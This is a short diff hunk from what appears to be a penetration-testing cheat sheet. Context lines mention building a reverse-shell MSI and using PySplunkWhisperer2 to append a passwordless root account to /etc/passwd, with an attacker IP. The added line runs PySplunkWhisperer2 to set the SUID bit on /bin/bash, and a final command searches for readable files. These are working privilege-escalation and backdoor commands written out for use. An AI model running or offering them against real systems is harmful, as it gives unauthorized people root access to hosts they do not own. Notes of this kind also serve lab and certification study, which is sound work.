@@ -616,6 +616,7 @@ msi -o reverse_shell.msi
 <user> --password <password> --payload "echo
 'user:pass:0:0:,,,:/root:/bin/bash' >>
 /etc/passwd" --lhost <Attacker IP>
+			- Alt: python3 PySplunkWhisperer2_local.py --username <user> --password <pass> --payload "chmod +s /bin/bash"
 		- Find readable files: 
 			- find / -group <group> -readable 2>/dev/null
 				- You may also command form you notes above
